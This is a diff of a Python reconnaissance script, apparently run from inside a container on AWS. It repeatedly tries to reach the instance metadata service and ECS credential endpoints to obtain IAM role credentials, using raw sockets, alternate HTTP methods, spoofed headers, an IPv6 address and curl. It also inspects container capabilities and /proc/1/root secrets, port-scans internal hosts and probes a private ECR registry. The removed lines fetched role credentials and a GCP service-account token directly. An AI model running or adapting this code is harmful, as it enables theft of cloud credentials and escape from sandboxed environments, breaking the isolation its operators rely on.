@@ -86,31 +86,62 @@ for hp in [('10.172.48.1',443),('10.172.48.1',80),('169.254.169.254',80),('169.2
     except Exception as e:
         p(hp, 'ERR', repr(e))
 sec('IMDS')
-p('v1-direct', http('http://169.254.169.254/latest/meta-data/', direct=True))
-p('v1-ecs', http('http://169.254.170.2/v2/credentials/', direct=True))
-it = http('http://169.254.169.254/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'21600'}, direct=True)
-p('v2-token', it)
-tok = ''
+def raw_http(host, port, req, timeout=5):
+    import socket
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+        s.settimeout(timeout)
+        s.sendall(req.encode())
+        data=b''
+        try:
+            while True:
+                c=s.recv(4096)
+                if not c: break
+                data+=c
+                if len(data)>8000: break
+        except Exception:
+            pass
+        s.close()
+        return data.decode('utf-8','replace')
+    except Exception as e:
+        return 'ERR '+repr(e)
+TOKD={'X-aws-ec2-metadata-token-ttl-seconds':'21600'}
+p('v1-root', http('http://169.254.169.254/latest/meta-data/', direct=True))
+p('v1-rolelist', http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', direct=True))
+p('v1-identity', http('http://169.254.169.254/latest/dynamic/instance-identity/document', direct=True))
+p('v2-token-PUT-httpclient', http('http://169.254.169.254/latest/api/token', method='PUT', headers=TOKD, data=b'', direct=True))
+p('v2-token-PUT-nodata', http('http://169.254.169.254/latest/api/token', method='PUT', headers=TOKD, direct=True))
+p('v2-token-GET', http('http://169.254.169.254/latest/api/token', headers=TOKD, direct=True))
+p('v2-token-POST', http('http://169.254.169.254/latest/api/token', method='POST', headers=TOKD, data=b'', direct=True))
+p('v2-token-raw', raw_http('169.254.169.254',80,'PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\nConnection: close\r\n\r\n'))
+p('v2-token-raw10', raw_http('169.254.169.254',80,'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n'))
+p('v1-raw', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n'))
+p('v1-raw-ua', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: curl/8.5.0\r\nConnection: close\r\n\r\n'))
+p('v1-raw-xff', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n'))
 try:
-    if it.startswith('HTTP 200'):
-        tok = it.split('\n',1)[1].strip()
-except Exception:
-    pass
-if tok:
-    hdr={'X-aws-ec2-metadata-token': tok}
-    p('v2-root', http('http://169.254.169.254/latest/meta-data/', headers=hdr, direct=True))
-    rl = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=hdr, direct=True)
-    p('v2-rolelist', rl)
-    role=''
-    if rl.startswith('HTTP 200'):
-        role = rl.split('\n',1)[1].strip().split('\n')[0].strip()
-    if role:
-        p('v2-creds', http('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=hdr, direct=True))
-    p('v2-identity', http('http://169.254.169.254/latest/dynamic/instance-identity/document', headers=hdr, direct=True))
-    p('v2-userdata', http('http://169.254.169.254/latest/user-data', headers=hdr, direct=True))
-p('gcp', http('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'}, direct=True))
-p('k8s-anon', http('https://10.172.48.1/version', direct=True))
-p('k8s-svc', http('https://kubernetes.default.svc/version', direct=True))
+    import socket
+    p('ipv6-imds', socket.getaddrinfo('fd00:ec2::254',80)[:1])
+    p('ipv6-imds-http', raw_http('fd00:ec2::254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: [fd00:ec2::254]\r\nConnection: close\r\n\r\n'))
+except Exception as e:
+    p('ipv6-imds ERR', repr(e))
+p('curl-which', sh('command -v curl; curl --version 2>&1 | head -2'))
+p('curl-imds2', sh("curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -i http://169.254.169.254/latest/api/token 2>&1 | head -20"))
+p('curl-imds1', sh("curl -s -m 5 -i http://169.254.169.254/latest/meta-data/ 2>&1 | head -20"))
+p('ecs-rel', http('http://169.254.170.2/v2/credentials/00000000-0000-0000-0000-000000000000', direct=True))
+p('ecs-rel-fs', http('http://169.254.170.2/v2/credentials', direct=True))
+sec('CAPS')
+p(sh('cat /proc/self/status | egrep "Cap|Seccomp|NoNewPrivs"; cat /proc/1/status | egrep "Cap|Seccomp|NoNewPrivs"; ls -la /run /run/podman /run/containers 2>&1; ls -la /proc/1/root/var/run/secrets 2>&1;ls -la /proc/1/root 2>&1 | head'))
+sec('NET')
+p('nat-ip', http('https://httpbin.org/ip', direct=True))
+p('sts', http('https://sts.us-east-2.amazonaws.com/', direct=True))
+p('ecr-api', http('https://api.ecr.us-east-2.amazonaws.com/', direct=True))
+p('ecr-auth-vpc', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/', direct=True))
+for ip in ['10.172.48.1','10.172.48.10','10.172.48.11','10.172.52.1']:
+    for port in [443,53,80]:
+        try:
+            s=socket.create_connection((ip,port),timeout=2); s.close(); p(ip,port,'OPEN')
+        except Exception as e:
+            p(ip,port,'ERR',type(e).__name__)
 sec('ECR')
 p('ecr-v2', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/', direct=True))
 p('ecr-tags', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/poc2-1795110817433-image/tags/list', direct=True))
